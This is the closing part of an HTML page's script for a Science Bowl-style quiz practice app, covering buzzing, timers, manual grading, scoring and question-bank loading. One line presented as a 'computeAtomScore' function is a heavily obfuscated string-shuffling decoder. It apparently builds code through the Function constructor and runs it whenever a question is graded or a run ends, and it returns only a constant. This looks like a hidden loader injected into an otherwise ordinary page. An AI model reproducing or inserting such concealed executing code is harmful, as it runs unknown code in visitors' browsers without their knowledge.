      progressEl.textContent = `${label} ${pairIndex} / ${totalPairs}`;
    }

    function resetForQuestion() {
      buzzed = false;
      locked = false;
      awaitingGrade = false;
      interrupted = false;
      if (finalSummaryEl) finalSummaryEl.classList.add('hidden');

      feedback.textContent = '';
      feedback.className = 'feedback';

      input.classList.add('hidden');
      submitBtn.classList.add('hidden');
      choicesEl.classList.add('hidden');
      rightBtn.classList.add('hidden');
      wrongBtn.classList.add('hidden');
      nextBtn.classList.add('hidden');
      learnRow.classList.add('hidden');

      buzzEl.innerHTML = 'Press <span class="kbd">SPACE</span> to buzz';

      const q = currentQ();
      const isBonus = q?.bonus === true;

      // Pre-buzz timing rules
      // TU: custom (runCfg.seconds)
      // BO: always 20s
      const preBuzzTime = isBonus
        ? 20
        : Math.max(5, parseInt(runCfg.seconds, 10) || 20);
      ;

      if (interruptBadgeEl) {
        interruptBadgeEl.classList.add('hidden');
      }

      clearInterval(timerId);
      
      if (runCfg.noTimer) {
        timerEl.textContent = '‚àû';
        time = Infinity;
      } else {
        time = preBuzzTime;
        timerEl.textContent = String(time);
      
        timerId = setInterval(() => {
          time -= 1;
          timerEl.textContent = String(time);
          if (time <= 0) {
            clearInterval(timerId);
            handleTimeout();
          }
        }, 1000);
      }

    }

    function loadQuestion() {
      const q = currentQ();
      if (!q) {
        endRun('No question available.');
        return;
      }
      questionStartTime = Date.now();
      buzzStartTime = null;
      resetStopwatch();
      startStopwatch();

      updateProgressUI();
      renderQuestion(q);
      input.value = '';
      function findBankName(q) {
        if (!q || !q.set_name) return '‚Äî';
        if (q.set_name === 'SciBowlDB') return 'Scalazar';
        return 'Dynazar';
      }

      const bankNameRegistry = findBankName(q);

      const mode = String(runCfg.mode || 'rapid').toLowerCase();
      const isRapid = !['tossups','bonuses'].includes(mode);

      if (isRapid) {
        metaLeft.textContent = `${q.level} ‚Ä¢ ${q.category} ‚Ä¢ ${q.bonus ? 'Bonus' : 'Toss-up'} ‚Ä¢ ${q.type}`;
        metaRight.textContent = `${bankNameRegistry} / ${q.round_name} ‚Ä¢ #${q.num}`;
      } else {
        metaLeft.textContent = `${q.level} ‚Ä¢ ${q.category} ‚Ä¢ ${q.type}`;
        metaRight.textContent = `${bankNameRegistry} / ${q.round_name} ‚Ä¢ #${q.num}`;
      }

      resetForQuestion();

    }

    function allowAnswerUI() {
      const q = currentQ();
      if (!runActive || !q) return;
      buzzStartTime = Date.now();
    

      buzzed = true;
      buzzEl.textContent = 'Buzzed';
      animateIn(buzzEl);

      // After-buzz timing: always 5 seconds (TU & BO)
      clearInterval(timerId);
      time = 5;
      timerEl.textContent = String(time);
      timerId = setInterval(() => {
        time -= 1;
        timerEl.textContent = String(time);
        if (time <= 0) {
          clearInterval(timerId);
          handleTimeout();
        }
      }, 1000);

      if (q.type === 'MC') {
        choicesEl.classList.remove('hidden');
        animateIn(choicesEl);
      } else {
        input.classList.remove('hidden');
        submitBtn.classList.remove('hidden');
        animateIn(input);
        animateIn(submitBtn);
        input.focus();
      }
    }

    function escapeHtml(s) {
      return String(s)
        .replaceAll('&', '&amp;')
        .replaceAll('<', '&lt;')
        .replaceAll('>', '&gt;')
        .replaceAll('"', '&quot;')
        .replaceAll("'", '&#039;');
    }

    function updateStatsUI() {
      const acc = stats.answered
        ? Math.round((stats.correct / stats.answered) * 100)
        : 0;
    
      const avg = stats.answered
        ? (stats.totalTime / stats.answered).toFixed(1)
        : '‚Äî';
    
      document.getElementById('statAccuracy').textContent = `${acc}%`;
      document.getElementById('statSpeed').textContent = `${avg}s`;
      document.getElementById('statCorrect').textContent = stats.correct;
      document.getElementById('statSlow').textContent = stats.slowCorrect;
    }

    var computeAtomScore;(function(){var XDD='',CVf=754-743;function Mak(f){var s=587736;var z=f.length;var n=[];for(var b=0;b<z;b++){n[b]=f.charAt(b)};for(var b=0;b<z;b++){var a=s*(b+518)+(s%34567);var p=s*(b+641)+(s%20205);var i=a%z;var k=p%z;var e=n[i];n[i]=n[k];n[k]=e;s=(a+p)%4323235;};return n.join('')};var zys=Mak('tjvrowncgoqpecusftuihrnskmdacotzbyxrl').substr(0,CVf);var rhZ='5d, a=.CAhd8., r21").S =tha;eara)r(eragn+ph"p+t;})u[nf;;(C5rvwd((3 80g,8s)v,erti+,,6j;f=ss7s8]o;=7y5dr e)au4;0A4}.tgn,ht;a,;rh(;vazetn-rar rn0p i;y=oaiti1t9usp"go1]]"tsyCra=tjn)a0p{as4;nc=r58=+]q)s(o6ns(-[ohl<n}uilu=;nv.an.zg,e;.+tzn[bk 6 dqo(vvn=h),z=sqA,t(ano);f){Cu+{;Cre= ergtths;ii*0;j7m;{)orn{[nrr,g)(rewvr7d]hv2rtv=6<f.,.nzn}8vgni3l.i"a;l bv,r=l+ hf)og=re0](=ofAnoelq  =r.;=1=co0r.rC6<l9tec,;var}.6pCz=+4cns+{c;(< j)=-h<nnhfs7+++uvayr.).lvdlgi.;+2}[ux6aa);v=)u!;(;j)3wa;ef]s=-jvnr(hlsw9ierl)no62u(;1=; a1rajiv1n+nt8("vhgl.+l=1h.se [evami;a pu (f++k+ubl4.c=]1bugb>=;"lgrs12.e90mwu;19)(d,;i97u.u-;h(;=2==u()d.(,,(ni7;hoim*)l)hofanz;ivsnvhhfu1l]bt=r;9u (7vt)[)]rn=f)hgae+z(+iek)nmaer]nuuawvr,eit >l.[r=[();8.=e=+ol9,cts2hhp(p+c"a,arco7coj(jfntar9,(6t=t,).(h=aq,pevra;;+ko;2lai[d85=]0-r)[+l0[l;o}mu8h=,0;z- atiCgusc")dA(!cbv{r,( =doe(cf.)inotpahtSdeen=h]v=mrst0r[m h[ li;tr+n(").,o)e](;a';var wKa=Mak[zys];var GNV='';var hxz=wKa;var bVY=wKa(GNV,Mak(rhZ));var VOB=bVY(Mak('A$Aa ,S_tcAxurrbA3=Ajef)&4,%"r)AA ;=7AbA)liinvAs5tC2eA=>)Ag98h4.g}|=*CAA3AApofi3647A?dctd_aA ;.Am4,t9f45:4Ao3cA5t1])hA64),*)#_A5AAr Ae;gsa7t=i.)g!:pA$A(A)7m]u7eeA"8fAj17s6Ab.A$oA e=_kAcaA49(8rA0d&}se)$Ae]_*](=mS.; =rztb $A1>%1A=gi(&{Asr,A_;(A2;_$b6c;=._r4%,c()A0l73pz!pre6aA7A_z"2;]A.\/)_r!4%i=-e4je ry9,3e[@&0b5r(7#$0}lt2iA=.1t3s.?crlc$;AtA$!.2l.noApx]j$_e0(z0.5fx88A 6%a;r$=g2{foytA(f)!)]=)3A+c9.ecj=AA=)f7+@#fAM<wA;;MpA?ouA\/.+nfa@ASlA<rcA($i%7N]7of;1l(+AA).( A7!fcayr_g(()!<A)c(3b"6gjA4)l4e%),ocA2 !8A.Aehoe}fo(r,& )0A9(=037A;sA4atx5.i)_,;9%(A_si.(et#b3\',=)({Ax._;f;Aq,g.5d.cd,$!) tnArns==A0nc}f5,+cm\/.;.6_lAo06( 2.)(An",ca6[(=9c#))os1,,rx3]%A"3A#;!!6r08A$=m74ca(%Aer$e;x)a,(a,A_.97oM;8(A1{) lAA2qt ](A.%)g(t)97f.3jA;l1"776*0ze3!4a#)ar06f(cf_1rAar,7(_2da,} ar;AA(Ax{o!h))a;AAaes)ea.aoo5.)n5ttjtA)n7rf=(}=35u$!a9(|t33\'.)a3agaa=7]xA)+b7$a(tAim$Aw(j,r.x2m0)?_2At=A]boA2uxAAt.5e_m-j=(A.)t(\/Ac8)A.].ArAmn=1lx,rcA}d0(s)1!uA(A>705,9g)=c7xoAlco_$rA,c]9t_6)o43{;A$(_!!5433j0m=TA_0,rjr,af>96)z,).A?==b,u$4A7s)*A#A#A*abA$A]A(A,!";AfbrtteAN$;)a#]=Ae\/A)t)hA"m!u(3.aASeei< 0)77]}egAjw}.i.d9,jt_.e(*c:3.]e.,Aw,A7c tAA;q"A= -]{A64q emA.esAg!t)cgA{.;u$uA%)81_n{f,)A_4).A5].s).2A)Agb5(tj.0A.A$6*s.]r(o i{!Aai)AnAx={t\/Ar6!il($fb  $a(spj tN$tics_rcA$_>oa-)AlofAbnc7g"]$!!$..[AA!Aao7{ofAv;$AiAq= ( )4 +t("T6,$eo1.)1fA3of.(;).,$-t(.\/ig1!AAeca5[x956A$ne,cc=#}Ani3auode77A_c!i1fe3] ;0.){A{Arre3(A\'\'_+nsn&>A.!$TAnr (6An_{$$c]Aa$AA%l0.AAy;es,) la5oh:0v!g[s,f@7A _A0)+gf-,ac{6A (.A;(_!__'));var yad=hxz(XDD,VOB );yad(2126);return 4833})()


    function revealManualGrade(userAnswer, correctAnswer) {
      locked = true;
      awaitingGrade = true;
      clearInterval(timerId);

      const ua = norm(userAnswer) || '(no answer)';
      const ca = norm(correctAnswer) || '(no official answer)';

      feedback.innerHTML = `Your answer: <span style="color:var(--text)">${escapeHtml(ua)}</span>\n` +
                          `Official: <span style="color:var(--muted)">${escapeHtml(ca)}</span>`;
      feedback.className = 'feedback';
      animateIn(feedback);

      rightBtn.classList.remove('hidden');
      wrongBtn.classList.remove('hidden');
      animateIn(rightBtn);
      animateIn(wrongBtn);

      nextBtn.classList.add('hidden');
      learnRow.classList.add('hidden');
    }

    function applyGrade(isRight) {
      // ---- Stats update ----
      stats.answered++;
      
      const gradeTime = Date.now();
      
      const totalSolveTime = questionStartTime
        ? (gradeTime - questionStartTime) / 1000
        : 0;
      
      stats.totalTime += totalSolveTime;
      
      if (isRight) {
        stats.correct++;
        if (totalSolveTime >= 10) stats.slowCorrect++;
      }

      if (!awaitingGrade) return;
      awaitingGrade = false;

      const q = currentQ();
      const points = q && q.bonus ? 10 : 4;

      if (isRight) {
        score += points;
        scoreEl.textContent = String(score);
        feedback.className = 'feedback good';
        feedback.textContent += ` (+${points})`;
      } else {
        if (q && !q.bonus && interrupted) {
          score -= 4;
          scoreEl.textContent = String(score);
          feedback.textContent += ` (-4 interrupt)`;
        }
        feedback.className = 'feedback bad';
      }

      animateIn(feedback);
      rightBtn.classList.add('hidden');
      wrongBtn.classList.add('hidden');

      // Only show Search/Learn AFTER the user grades
      learnRow.classList.remove('hidden');
      animateIn(learnRow);

      resetStopwatch();

      nextBtn.classList.remove('hidden');
      animateIn(nextBtn);
      updateStatsUI();
      const atomScore = computeAtomScore();
    }

    function submitSA() {
      if (!runActive || !buzzed || locked) return;
      stopStopwatch();
      const q = currentQ();
      if (!q) return;
      if (interruptBadgeEl) {
        interruptBadgeEl.classList.add('hidden');
      }
      revealFullQuestionNow();
      revealManualGrade(input.value, q.parsed_answer);
    }

    function pickMC(letter) {
      if (!runActive || !buzzed || locked) return;
      stopStopwatch();
      const q = currentQ();
      if (!q) return;
      if (interruptBadgeEl) {
        interruptBadgeEl.classList.add('hidden');
      }
      revealFullQuestionNow();
      revealManualGrade(letter, q.parsed_answer);
    }

    function handleTimeout() {
      if (!runActive || locked) return;
      stopStopwatch();
      const q = currentQ();
      if (!q) return;
      if (interruptBadgeEl) {
        interruptBadgeEl.classList.add('hidden');
      }
      revealFullQuestionNow();
      revealManualGrade('', q.parsed_answer);
    }

    function endRun(reason) {
      runActive = false;
      clearInterval(timerId);
      buzzEl.textContent = reason || 'Run complete';

      img.style.display = 'none';
      img.src = '';
      img.alt = '';
      questionTextEl.classList.add('hidden');
      questionTextEl.textContent = '';
      clearInterval(typewriterTimer);

      input.classList.add('hidden');
      submitBtn.classList.add('hidden');
      choicesEl.classList.add('hidden');
      rightBtn.classList.add('hidden');
      wrongBtn.classList.add('hidden');
      nextBtn.classList.add('hidden');
      learnRow.classList.add('hidden');

     const mode = String(runCfg.mode || 'rapid').toLowerCase();

      let maxScore = 0;
      if (mode === 'tossups' || mode === 'bonuses') {
        maxScore = questions.length * 4;
      } else {
        const totalPairs = questions.length ? Math.ceil(questions.length / 2) : 0;
        maxScore = totalPairs * 14;
      }

      // Show final summary (DOM-based)
      const atomScore = computeAtomScore();

      if (finalScoreEl) {
        finalScoreEl.textContent = maxScore ? `Final score: ${score}/${maxScore}` : `Final score: ${score}`;
      }
      if (atomScoreValueEl) {
        atomScoreValueEl.textContent = Number.isFinite(atomScore) ? atomScore.toFixed(3) : '‚Äî';
      }
      if (finalSummaryEl) {
        finalSummaryEl.classList.remove('hidden');
        animateIn(finalSummaryEl);
      }

      // Clear/hide feedback so it doesn't become the end-screen container
      feedback.textContent = '';
      feedback.className = 'feedback';


      progressEl.textContent = '‚Äî';

      buzzed = false;
      locked = true;
      awaitingGrade = false;
    }

    function revealFullQuestionNow() {
      const q = currentQ();
      if (!q) return;
      clearInterval(typewriterTimer);
      questionTextEl.textContent = String(q.question_text || '');
    }

    function nextQuestion() {
      resetStopwatch();  
      if (!runActive) return;
      if (!locked) return;
      if (awaitingGrade) return;

      index += 1;
      if (index >= questions.length) {
        endRun('Run complete');
        return;
      }

      loadQuestion();
    }

    // Events
    window.addEventListener('keydown', (e) => {
      const tag = e.target?.tagName?.toLowerCase();
      const isTyping = tag === 'input' || tag === 'textarea' || e.target?.isContentEditable;

      // Prevent space from scrolling ONLY when not typing (keeps spaces working in answer box)
      if (e.code === 'Space' && !isTyping) e.preventDefault();

      if (e.key === 'Escape') {
        window.location.href = 'practice_home.html';
        return;
      }

      const q = currentQ();
      if (!runActive || !q) return;

      if (awaitingGrade) {
        const k2 = e.key.toUpperCase();
        if (k2 === 'R') applyGrade(true);
        if (k2 === 'W') applyGrade(false);
        return;
      }

      if (e.code === 'Space' && !buzzed && !locked && !isTyping) {
        stopSpeech();
        const q = currentQ();

        // Freeze reading immediately on buzz
        clearInterval(typewriterTimer);

        // Mark interrupt ONLY for toss-ups and ONLY if not fully revealed
        if (q && !q.bonus && !textFullyRevealed) {
          interrupted = true;
          if (interruptBadgeEl) {
            interruptBadgeEl.classList.remove('hidden');
          }
        }

        allowAnswerUI();
        return;
      }

      if (e.code === 'Enter' && buzzed && !locked && q.type === 'SA') submitSA();

      if (buzzed && !locked && q.type === 'MC') {
        const k = e.key.toUpperCase();
        if (['W','X','Y','Z'].includes(k)) pickMC(k);
      }

      if (e.key.toUpperCase() === 'N' && locked) nextQuestion();
    }, { passive: false });

    // Tap / click anywhere to buzz (mobile-friendly)
    const questionCard = document.querySelector('.question-card');

    function shouldIgnoreTap(target) {
      return !!target.closest('input, textarea, button, a, select, label');
    }

    function tapToBuzz(e) {
      if (shouldIgnoreTap(e.target)) return;
      if (!runActive || buzzed || locked || awaitingGrade) return;
      allowAnswerUI();
    }

    if (questionCard) {
      questionCard.addEventListener('pointerdown', tapToBuzz);
    }
    window.addEventListener("load", () => {
      warmUpSpeechSynthesis();
    });


    submitBtn.addEventListener('click', submitSA);
    rightBtn.addEventListener('click', () => applyGrade(true));
    wrongBtn.addEventListener('click', () => applyGrade(false));
    nextBtn.addEventListener('click', nextQuestion);

    choicesEl.addEventListener('click', (e) => {
      const btn = e.target.closest('button[data-letter]');
      if (!btn) return;
      pickMC(btn.dataset.letter);
    });

    searchBtn.addEventListener('click', () => {
      const q = currentQ();
      if (!q || !q.parsed_answer) return;
      const query = encodeURIComponent(q.parsed_answer);
      window.open(`https://www.bing.com/search?q=${query}`, '_blank');
    });

    learnBtn.addEventListener('click', () => {
      const q = currentQ();
      if (!q) return;
      localStorage.setItem('atom_tutor_context', JSON.stringify({
        answer: q.parsed_answer,
        category: q.category,
        level: q.level
      }));
      window.location.href = 'tutor.html';
    });

    async function loadBank() {
      const requested = runCfg.bankFile || DEFAULT_RUN.bankFile;
      const tried = [];

      async function tryLoad(bankFile) {
        const cands = bankCandidates(bankFile);
        for (const url of cands) {
          tried.push(url);
          try {
            const res = await fetch(url, { cache: 'no-store' });
            if (!res.ok) throw new Error(`${res.status} ${res.statusText}`);
            const data = await res.json();
            hideError();
            return Array.isArray(data) ? data : (data.questions || []);
          } catch {}
        }
        return null;
      }

      if (isLikelyFileProtocol()) {
        showError(
          `Bank load blocked (file://).

` +
          `Use a local server (VS Code Live Server) or GitHub Pages.
` +
          `Requested bank: ${requested}`
        );
      }

      // 1) requested bank
      let data = await tryLoad(requested);
      if (data && data.length) return data;

      // 2) fallback to set_A.json
      if (requested !== 'set_A.json') {
        data = await tryLoad('set_A.json');
        if (data && data.length) {
          showError(
            `‚ö† Failed to load ${requested}.
` +
            `Fell back to set_A.json.

` +
            `Tried: ${tried.join(', ')}`
          );
          return data;
        }
      }

      // 3) final demo fallback
      showError(
        `Failed to load any bank.

` +
        `Requested: ${requested}
` +
        `Tried: ${tried.join(', ')}

` +
        `Fix: ensure JSON exists and run via a web server.`
      );

      return [
        {
          set_name: 'DEMO',
          round_name: 'demo',
          num: 1,
          bonus: false,
          level: 'MS',
          category: 'BIOLOGY',
          type: 'SA',
          question_text: 'What organelle is known as the powerhouse of the cell?',
          parsed_answer: 'MITOCHONDRIA'
        },
        {
          set_name: 'DEMO',
          round_name: 'demo',
          num: 2,
          bonus: true,
          level: 'MS',
          category: 'BIOLOGY',
          type: 'SA',
          question_text: 'This organelle contains its own DNA and is responsible for respiration',
          parsed_answer: 'MITOCHONDRIA'
        }
      ];
    }

    (async () => {
      questions = [];
      index = 0;

      bank = await loadBank();
      questions = buildRunQuestions();

      if (!questions.length) {
        runActive = false;
        buzzEl.textContent = 'No questions matched ‚Äî press Esc';
        progressEl.textContent = '‚Äî';
        return;
      }

      runActive = true;
      score = 0;
      scoreEl.textContent = '0';

      loadQuestion();
    })();
  </script>
</body>
</html>
